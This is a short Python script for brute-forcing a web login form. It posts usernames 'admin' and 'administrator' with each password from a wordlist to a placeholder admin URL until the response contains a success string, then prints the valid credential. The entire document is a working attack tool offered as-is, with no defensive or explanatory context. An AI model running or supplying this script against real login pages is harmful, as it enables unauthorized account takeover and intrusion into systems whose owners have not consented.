#web login form bruteforcing 

import requests
import sys

target = "https://example.com/admin/"
usernames = ['admin', 'administrator']
passwords = "ssh-common-password.txt" 
needle = "Welcome back"

for username in usernames:
    with open(passwords, 'r' ) as password_list:
        for password in password_list:
            password = password.strip('\n').encode()
            sys.stdout.write("[x] Attempting user:pass -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={'username':username, 'password':password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>] Valid password '{}' found for user '{}'!".format(password.decode(),username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write('\n')
        sys.stdout.write("\tNo password found for '{}'!".format(username))
        sys.stdout.write('\n')
